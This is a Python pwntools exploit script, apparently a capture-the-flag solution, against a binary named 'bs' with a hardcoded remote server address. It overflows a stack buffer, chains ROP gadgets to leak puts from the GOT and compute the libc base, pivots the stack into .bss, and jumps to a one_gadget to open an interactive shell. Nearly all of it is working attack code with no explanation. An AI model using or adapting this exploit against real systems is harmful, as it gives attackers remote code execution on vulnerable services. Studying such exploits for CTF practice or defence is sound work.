#!/usr/bin/env python
# -*- coding: utf-8 -*-

from pwn import *
from time import sleep
import os
import sys

elfPath = "./bs"
libcPath = "./libc.so.6"
remoteAddr = "47.100.96.94"
remotePort = 9999

context.binary = elfPath
elf = context.binary
if sys.argv[1] == "l":
    io = process(elfPath)
    libc = elf.libc

else:
    if sys.argv[1] == "d":
        io = process(elfPath, env = {"LD_PRELOAD": libcPath})
    else:
        io = remote(remoteAddr, remotePort)
    if libcPath:
        libc = ELF(libcPath)

context.log_level = "debug"
context.terminal = ["deepin-terminal", "-x", "sh", "-c"]
success = lambda name, value: log.success("{} -> {:#x}".format(name, value))

def DEBUG():
    base = int(os.popen("pmap {}| awk '{{print $1}}'".format(io.pid)).readlines()[1], 16)
    raw_input("DEBUG: ")

if __name__ == "__main__":
    '''
    0x0000000000400c03 : pop rdi ; ret
    0x0000000000400c01 : pop rsi ; pop r15 ; ret
    0x0000000000400955 : leave ; ret
    '''
    prdi = 0x0000000000400c03
    prsip = 0x0000000000400c01
    leaveret = 0x0000000000400955
    libc.sym['one_gadget'] = 0xf1147
    base = elf.bss() + 0x500

    payload = flat('\0' * 0x1010, base - 0x8, prdi, elf.got['puts'], elf.plt['puts'])
    payload += flat(prdi, 0, prsip, base, 0, elf.plt['read'])
    payload += flat(leaveret)
    payload = payload.ljust(0x2000, '\0')

    io.sendlineafter("send?\n", str(0x2000))
    io.send(payload)

    libc.address = u64(io.recvuntil('\x7f')[-6: ] + '\0\0') - libc.sym['puts']
    success("libc", libc.address)
    io.send(p64(libc.sym['one_gadget']))

    io.interactive()
